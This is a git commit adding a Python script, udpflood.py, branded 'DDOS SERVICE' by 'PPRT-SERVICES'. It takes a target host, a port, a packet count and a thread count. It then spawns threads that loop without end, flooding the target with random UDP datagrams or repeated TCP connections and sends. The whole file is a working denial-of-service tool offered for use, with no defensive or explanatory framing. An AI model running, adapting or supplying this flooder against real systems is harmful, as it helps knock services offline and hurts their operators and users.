28e05d052589258d80a738f66a3717eaa72a125e
Robert Fernandes <97995598+fernandesrobert@users.noreply.github.com>
2023-11-20 15:05:50 -0400

    firts commit
    primary commit

---
+++ udpflood.py
@@ -0,0 +1,119 @@
+import signal
+import time
+import socket
+import random
+import threading
+import sys
+import os
+from os import system, name
+
+ascii_art = """
+ -----------------------------------------------------------------------------------
+ ---------------ooooooooo.   ooooooooo.   ooooooooo.   ooooooooooooo----------------
+ ---------------`888   `Y88. `888   `Y88. `888   `Y88. 8'   888   `8----------------
+ --------------- 888   .d88'  888   .d88'  888   .d88'      888     ----------------
+ --------------- 888ooo88P'   888ooo88P'   888ooo88P'       888     ----------------
+ --------------- 888          888          888`88b.         888     ----------------
+ --------------- 888          888          888  `88b.       888     ----------------
+ ---------------o888o        o888o        o888o  o888o     o888o    ----------------
+ ----------------------------------DDOS SERVICE-------------------------------------
+ -----------------------------------------------------------------------------------
+"""
+print(ascii_art)
+
+print("\033[1;32;40m ==> BY PPRT-SERVICES <==  \n")
+test = input()
+if test == "n":
+	exit(0)
+ip = str(input(" Host/Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Packets per one connection:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"UDP Sent!!!")
+		except:
+			s.close()
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"TCP Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
+
+def new():
+	for y in range(threads):
+		if choice == 'y':
+			th = threading.Thread(target = run)
+			th.start()
+		else:
+			th = threading.Thread(target = run2)
+			th.start()
+
+def whereuwere():
+    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
+    print("Put 1 for UDP and 2 for TCP")
+    whereman = str(input(" 1 or 2 >:("))
+    if whereman == '1':
+        run()
+    else:
+        run2()
+
+def clear():
+    if name == 'nt':
+        _ = system('cls')
+    else:
+        _ = system('clear')
+
+def byebye():
+	clear()
+	os.system("figlet Youre Leaving Sir -f slant")
+	sys.exit(130)
+
+def exit_gracefully(signum, frame):
+    # restore the original signal handler
+    signal.signal(signal.SIGINT, original_sigint)
+
+    try:
+        exitc = str(input(" You wanna exit bby <3 ?:"))
+        if exitc == 'y':
+
+            byebye()
+
+    except KeyboardInterrupt:
+        print("Ok ok")
+        byebye()
+
+    # restore the gracefully exit handler
+    signal.signal(signal.SIGINT, exit_gracefully)
+
+if __name__ == '__main__':
+    # store SIGINT handler
+    original_sigint = signal.getsignal(signal.SIGINT)
+    signal.signal(signal.SIGINT, exit_gracefully)
